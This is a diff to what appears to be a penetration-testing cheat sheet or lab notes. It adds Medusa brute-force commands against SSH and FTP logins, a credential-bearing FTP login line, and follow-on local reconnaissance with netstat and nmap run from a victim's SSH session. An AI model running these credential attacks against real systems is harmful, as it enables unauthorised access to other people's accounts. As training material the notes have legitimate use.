@@ -116,10 +116,11 @@ Command to test for empty or default passwords : `medusa -h 10.0.0.5 -U username
 
 ## Web Services
 To login into SSH Service where username is given and password is brute-forced using dictionary : `medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3`
-
 Command for SSH to gain access : `ssh sshuser@<IP> -p PORT`
-Targeting FTP Server : `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5` 
 
+Targeting FTP Server : `medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5`  - Use this when into SSH Session of the Victim
+To login into FTP Server : `ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost`
 ### Expanding the Attack Surface
 To list all services and and open ports : `ntestat -tulpn | grep LISTEN`
 For further recon, we can use : `nmap localhost`
+
